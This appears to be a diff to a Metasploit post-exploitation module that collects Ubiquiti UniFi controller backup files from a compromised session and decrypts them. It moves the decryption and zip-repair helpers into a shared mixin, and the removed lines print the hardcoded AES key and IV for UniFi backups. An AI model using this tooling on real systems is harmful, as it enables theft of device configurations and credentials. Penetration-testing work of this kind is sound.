@@ -3,7 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'zip'
+require 'msf/core/auxiliary/ubiquiti'
 
 class MetasploitModule < Msf::Post
   include Msf::Post::File
@@ -44,31 +44,6 @@ class MetasploitModule < Msf::Post
       ])
   end
 
-  def decrypt(contents)
-    aes = OpenSSL::Cipher.new('aes-128-cbc')
-    aes.key = 'bcyangkmluohmars' # https://github.com/zhangyoufu/unifi-backup-decrypt/blob/master/Extract.java#L17
-    aes.padding = 0
-    aes.decrypt
-    aes.iv = 'ubntenterpriseap'
-    aes.update(contents)
-  end
-
-  def repair(fname)
-    zip_exe = Msf::Util::Helper.which('zip')
-    if zip_exe.nil?
-      return nil
-    end
-    print_status('Attempting to repair zip file (this is normal)')
-    temp_file = Rex::Quickfile.new("fixed_zip")
-    system("yes | #{zip_exe} -FF #{fname} --out #{temp_file.path}.zip > /dev/null")
-    if $? == 0
-      return File.read("#{temp_file.path}.zip")
-    else
-      print_error('Error fixing zip.  Attempt manually.')
-      nil
-    end
-  end
-
   def find_save_files(d)
     case session.platform
     when 'windows'
@@ -96,7 +71,7 @@ class MetasploitModule < Msf::Post
       loot_path = store_loot('ubiquiti.unifi.backup', 'application/zip', session,
                              f, file, 'Ubiquiti Unifi Controller Encrypted Backup Zip')
       print_good("File #{full} saved to #{loot_path}")
-      decrypted_data = decrypt(f)
+      decrypted_data = decrypt_unf(f)
       if decrypted_data.nil? || decrypted_data.empty?
         print_error("Unable to decrypt #{loot_path}")
         next
@@ -106,7 +81,7 @@ class MetasploitModule < Msf::Post
       print_good("File #{file} DECRYPTED and saved to #{loot_path}.  File needs to be repair via `zip -FF`")
       # ruby zip can't repair, we can try on command line but its not likely to succeed on all platforms
       # tested on kali
-      repaired = repair(loot_path)
+      repaired = repair_zip(loot_path)
       if repaired.nil?
         print_bad("Repair failed on #{loot_path}")
         return
